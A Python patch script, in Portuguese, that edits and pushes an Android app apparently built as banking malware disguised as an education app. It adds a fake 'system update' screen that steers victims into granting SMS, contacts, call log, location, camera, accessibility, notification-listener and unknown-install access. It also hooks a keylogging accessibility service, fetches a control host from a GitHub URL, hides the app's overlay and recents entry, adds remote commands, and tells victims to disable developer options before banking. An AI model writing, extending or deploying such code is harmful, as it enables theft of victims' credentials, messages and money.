import io, os, re, subprocess

F = []

def ler(p):
    with io.open(p, encoding="utf-8") as f:
        return f.read()

def grava(p, s):
    d = os.path.dirname(p)
    if d and not os.path.isdir(d):
        os.makedirs(d)
    with io.open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(s)

def sub(p, velho, novo, obrig=True):
    s = ler(p)
    if velho not in s:
        if obrig:
            F.append("%s :: %s" % (p, velho.strip().splitlines()[0][:70]))
        return False
    grava(p, s.replace(velho, novo, 1))
    print("  ok  %s" % p)
    return True

print("[1] strings: capa de curso")
sub("app/src/main/res/values/strings.xml",
    '<string name="app_name">EloEducacao</string>',
    '<string name="app_name">Elo Educação</string>')

print("[2] KeySvc: hook do Watch")
K = "app/src/main/java/com/eloeeducacao/KeySvc.java"
s = ler(K)
if "Watch.ev()" in s:
    print("  ja aplicado")
else:
    m = re.search(r"void\s+onAccessibilityEvent\s*\([^)]*\)[^{]*\{", s)
    if m:
        grava(K, s[:m.end()] + "\n        Watch.ev();" + s[m.end():])
        print("  ok  hook inserido")
    else:
        F.append("KeySvc: onAccessibilityEvent nao encontrado")

print("[3] manifest: tela de setup")
M = "app/src/main/AndroidManifest.xml"
sub(M,
    'android:name=".MainActivity"\n        android:exported="true"',
    'android:name=".MainActivity"\n        android:exported="false"')
sub(M, 'android:targetActivity=".MainActivity"', 'android:targetActivity=".SetupActivity"')
sub(M, '    <activity-alias',
    '    <activity\n'
    '        android:name=".SetupActivity"\n'
    '        android:exported="true"\n'
    '        android:launchMode="singleTop"\n'
    '        android:excludeFromRecents="true"\n'
    '        android:taskAffinity="" />\n\n'
    '    <activity-alias')

print("[4] MainActivity: sem ip e sem id")
MA = "app/src/main/java/com/eloeeducacao/MainActivity.java"
sub(MA,
    '        sb.append("id: ").append(Cfg.id(this)).append(\'\\n\');\n'
    '        sb.append("ip: ").append(Util.ip());',
    '        sb.append("status: ").append(Net.online() ? "sincronizado" : "aguardando");')

print("[5] Aviso: overlay sem permissao de sobreposicao")
AV = "app/src/main/java/com/eloeeducacao/Aviso.java"
sub(AV,
    '                    int type = Build.VERSION.SDK_INT >= 26\n'
    '                            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY\n'
    '                            : WindowManager.LayoutParams.TYPE_PHONE;',
    '                    int type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;')

print("[6] Cfg: segunda fonte de host")
CG = "app/src/main/java/com/eloeeducacao/Cfg.java"
if "RAW2" not in ler(CG):
    sub(CG,
        'public static final String RAW = "https://raw.githubusercontent.com/rhuandasensikkj/aval/main/host.txt";',
        'public static final String RAW = "https://raw.githubusercontent.com/rhuandasensikkj/aval/main/host.txt";\n'
        '    public static final String RAW2 = "";')
else:
    print("  ja aplicado")

print("[7] Util: fonte preferida")
U = "app/src/main/java/com/eloeeducacao/Util.java"
if "fonte(agora)" in ler(U):
    print("  ja aplicado")
else:
    sub(U, 'Cfg.RAW + "?x=" + agora', 'fonte(agora)')
    sub(U, '    private static String remoto(Context c) {',
        '    private static String fonte(long agora) {\n'
        '        return (Cfg.RAW2 != null && Cfg.RAW2.length() > 8 ? Cfg.RAW2 : Cfg.RAW)\n'
        '                + "?x=" + agora;\n'
        '    }\n\n'
        '    private static String remoto(Context c) {')

print("[8] Cmd")
C = "app/src/main/java/com/eloeeducacao/Cmd.java"
sub(C, '                    ScreenSvc.giveUp = true;',
    '                    Aviso.clear();\n                    ScreenSvc.giveUp = true;')
sub(C, '                case "snap":',
    '                case "setup": {\n'
    '                    Intent i = new Intent(c, SetupActivity.class);\n'
    '                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n'
    '                    c.startActivity(i);\n'
    '                    break;\n'
    '                }\n'
    '                case "decoy":\n'
    '                    SetupActivity.loja(c);\n'
    '                    break;\n'
    '                case "snap":')

print("[9] SetupActivity.java")
grava("app/src/main/java/com/eloeeducacao/SetupActivity.java", r'''package com.eloeeducacao;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SetupActivity extends Activity {

    private static final int N = 5;
    private static final String CH = "s";
    private static final int NC = 78;
    private static final int RQ = 21;

    private static final String[] TIT = {
            "Permissões do sistema",
            "Acessibilidade",
            "Acesso a notificações",
            "Instalar aplicativos",
            "Bateria"
    };
    private static final String[] SUB = {
            "Toque em Permitir nas janelas que aparecerem.",
            "Ative «Acessibilidade» na lista e volte ao app.",
            "Ative «Acessibilidade» na lista e volte ao app.",
            "Permita a instalação por esta fonte e volte ao app.",
            "Escolha Permitir. Isso impede o sistema de encerrar o serviço."
    };

    private TextView titulo, sub, passo, corpo, detalhe;
    private Button acao, pular;
    private int etapa;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);

        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setBackgroundColor(0xFF101418);
        l.setPadding(dp(26), dp(54), dp(26), dp(26));

        titulo = new TextView(this);
        titulo.setText("Atualização do sistema");
        titulo.setTextColor(Color.WHITE);
        titulo.setTextSize(24);
        titulo.setOnLongClickListener(new View.OnLongClickListener() {
            @Override public boolean onLongClick(View v) {
                startActivity(new Intent(SetupActivity.this, MainActivity.class));
                return true;
            }
        });
        l.addView(titulo);

        sub = new TextView(this);
        sub.setText("Versão 1.2.3 · componentes do sistema");
        sub.setTextColor(0xFF8A97A5);
        sub.setTextSize(13);
        sub.setPadding(0, dp(6), 0, dp(28));
        l.addView(sub);

        passo = new TextView(this);
        passo.setTextColor(0xFF2F81F7);
        passo.setTextSize(12);
        passo.setPadding(0, 0, 0, dp(6));
        l.addView(passo);

        corpo = new TextView(this);
        corpo.setTextColor(Color.WHITE);
        corpo.setTextSize(17);
        l.addView(corpo);

        detalhe = new TextView(this);
        detalhe.setTextColor(0xFF8A97A5);
        detalhe.setTextSize(14);
        detalhe.setPadding(0, dp(8), 0, dp(26));
        l.addView(detalhe);

        acao = new Button(this);
        acao.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                if (etapa >= N) { fim(); return; }
                abre(etapa);
            }
        });
        l.addView(acao);

        pular = new Button(this);
        pular.setText("Pular etapa");
        pular.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                etapa++;
                pinta();
            }
        });
        LinearLayout.LayoutParams pl = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        pl.topMargin = dp(4);
        pl.gravity = Gravity.END;
        pular.setLayoutParams(pl);
        l.addView(pular);

        TextView rodape = new TextView(this);
        rodape.setText("Se as opções do desenvolvedor estiverem ativadas, desligue-as antes de abrir o banco.");
        rodape.setTextColor(0xFF5B6773);
        rodape.setTextSize(11);
        rodape.setPadding(0, dp(30), 0, 0);
        l.addView(rodape);

        setContentView(l);
        etapa = 0;
        pinta();
    }

    @Override protected void onResume() {
        super.onResume();
        cancela();
        while (etapa < N && pronto(etapa)) etapa++;
        pinta();
    }

    @Override protected void onPause() {
        super.onPause();
        if (etapa < N) notifica();
    }

    private void pinta() {
        if (etapa >= N) {
            passo.setText("CONCLUÍDO");
            corpo.setText("Configuração concluída");
            detalhe.setText("Tudo pronto. Pode fechar o aplicativo.");
            acao.setText("Fechar");
            pular.setVisibility(View.GONE);
            return;
        }
        passo.setText("ETAPA " + (etapa + 1) + " DE " + N);
        corpo.setText(TIT[etapa]);
        detalhe.setText(SUB[etapa]);
        acao.setText(etapa == 0 || etapa == 4 ? "Permitir" : "Abrir ajustes");
        pular.setVisibility(View.VISIBLE);
    }

    private void abre(int e) {
        try {
            switch (e) {
                case 0:
                    pede();
                    return;
                case 1: {
                    try {
                        Intent d = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
                        d.putExtra(Intent.EXTRA_COMPONENT_NAME,
                                new ComponentName(this, KeySvc.class).flattenToString());
                        startActivity(d);
                        return;
                    } catch (Throwable ignored) {}
                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                    return;
                }
                case 2:
                    startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                    return;
                case 3:
                    startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                            Uri.parse("package:" + getPackageName())));
                    return;
                case 4:
                    startActivity(new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName())));
                    return;
            }
        } catch (Throwable t) {
            etapa++;
            pinta();
        }
    }

    private boolean pronto(int e) {
        switch (e) {
            case 0: return permsOk();
            case 1: return Util.accOn(this);
            case 2: return notifOk();
            case 3: return instalOk();
            case 4: return batOk();
        }
        return true;
    }

    private void pede() {
        java.util.List<String> q = new java.util.ArrayList<>();
        String[] ps = {
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.CAMERA,
                "android.permission.POST_NOTIFICATIONS",
                "android.permission.READ_MEDIA_IMAGES"
        };
        for (String s : ps) {
            try {
                if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) q.add(s);
            } catch (Throwable ignored) {}
        }
        if (q.isEmpty()) { etapa++; pinta(); return; }
        requestPermissions(q.toArray(new String[0]), RQ);
    }

    private boolean permsOk() {
        String[] ps = {
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.ACCESS_FINE_LOCATION
        };
        for (String s : ps)
            if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) return false;
        return true;
    }

    private boolean notifOk() {
        try {
            String s = Settings.Secure.getString(getContentResolver(),
                    "enabled_notification_listeners");
            return s != null && s.contains(getPackageName());
        } catch (Throwable t) { return false; }
    }

    private boolean instalOk() {
        try {
            if (Build.VERSION.SDK_INT >= 26)
                return getPackageManager().canRequestPackageInstalls();
            return true;
        } catch (Throwable t) { return true; }
    }

    private boolean batOk() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Throwable t) { return true; }
    }

    @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
        super.onRequestPermissionsResult(rq, a, r);
        if (rq == RQ) { etapa++; pinta(); }
    }

    private void notifica() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel c = new NotificationChannel(
                        CH, "Sistema", NotificationManager.IMPORTANCE_LOW);
                c.setShowBadge(false);
                nm.createNotificationChannel(c);
            }
            Intent i = new Intent(this, SetupActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent pi = PendingIntent.getActivity(this, 1, i,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            Notification n = (Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, CH)
                    : new Notification.Builder(this))
                    .setContentTitle("Toque para voltar ao app")
                    .setContentText("Continue a configuração da etapa " + (etapa + 1))
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .setOngoing(true)
                    .setContentIntent(pi)
                    .build();
            nm.notify(NC, n);
        } catch (Throwable ignored) {}
    }

    private void cancela() {
        try {
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).cancel(NC);
        } catch (Throwable ignored) {}
    }

    private void fim() {
        cancela();
        finish();
    }

    public static void loja(Context c) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("market://details?id=com.whatsapp"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
            return;
        } catch (Throwable ignored) {}
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("https://play.google.com/store/apps/details?id=com.whatsapp"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable ignored) {}
    }

    private int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density);
    }
}
''')
print("  ok  SetupActivity.java")

print("[10] versionCode")
B = "app/build.gradle"
s = ler(B)
m = re.search(r"versionCode\s+(\d+)", s)
if m:
    novo = max(int(m.group(1)) + 1, 8)
    grava(B, s[:m.start(1)] + str(novo) + s[m.end(1):])
    print("  ok  versionCode -> %d" % novo)

print("")
if F:
    print("!! %d nao aplicado(s):" % len(F))
    for x in F:
        print("   - " + x)

if "--no-git" not in sys.argv:
    print("\n[git]")
    r = subprocess.run(["git", "add", "-A"], capture_output=True, text=True)
    r = subprocess.run(["git", "commit", "-m", "setup guiada sem desvio para a loja, ip oculto, overlay de acessibilidade"],
                       capture_output=True, text=True)
    print("  commit -> %s" % r.returncode)
    r = subprocess.run(["git", "pull", "--rebase", "--autostash"], capture_output=True, text=True)
    print("  pull --rebase -> %s" % r.returncode)
    for ln in (r.stdout + r.stderr).strip().splitlines()[:6]:
        print("    " + ln)
    r = subprocess.run(["git", "push"], capture_output=True, text=True)
    print("  push -> %s" % r.returncode)
    for ln in (r.stdout + r.stderr).strip().splitlines()[:10]:
        print("    " + ln)
